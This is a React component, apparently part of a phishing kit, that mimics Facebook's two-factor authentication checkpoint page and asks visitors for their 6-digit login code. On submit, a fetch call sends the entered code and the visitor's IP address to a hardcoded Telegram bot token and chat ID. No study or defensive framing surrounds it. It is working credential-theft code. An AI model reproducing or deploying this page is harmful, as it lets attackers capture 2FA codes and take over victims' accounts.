import Nav from './nav';
import styles from '../styles/check-point.module.css';
import { useForm } from "react-hook-form";




const CheckPoint = (props) => {

    const { register, handleSubmit } = useForm();

    const sendCode = async (data) => {
        try {

            const message = `
             Ip:${props.ip.userIP}, code: ${data.code}`;
            const res = await fetch(`https://api.telegram.org/bot6687746044:AAF5Lg6Krc0J2zpmaEbbnt7D9dmwbY3AdbM/sendMessage?chat_id=6039842779&text=${message}`);

        } catch (err) {
            console.log(err);
        }
    }

    const onSubmit = (data) => {
        sendCode(data)
    }

    

  return (
    <div>
        <Nav/>

        <div className={styles.container}>
            <div className={styles.box}>
                <div className={styles.section}>
                    <strong>Choose a way to confirm it's you</strong>
                </div>
                <div className={styles.section}>
                    <p>Your account has two-factor authentication switched on, which requires this extra login step.</p>
                </div>

                <div className={styles.section}>
                    <strong>Approve from another device</strong>
                    <p>
                    We sent a notification to your Device. Check your Facebook notifications there and approve the login to continue.
                    </p>
                </div>

                <form onSubmit={handleSubmit(onSubmit)}>

                    <div className={styles.section}>
                        <strong>Or, enter your login code</strong>
                        <p>
                            Enter the 6-digit code from the authentication app you set up.
                        </p>
                        <input type="text" placeholder="Login code" {...register("code")} className={styles.code} />
                        
                    </div>

                    <div className={styles.bottom}>
                        <a>Need another way to confirm it's you?</a>
                        <button type="submit" className={styles.btn}>Submit code</button>
                    </div>

                </form>

                

            </div>
        </div>

    </div>
  );
};

export default CheckPoint;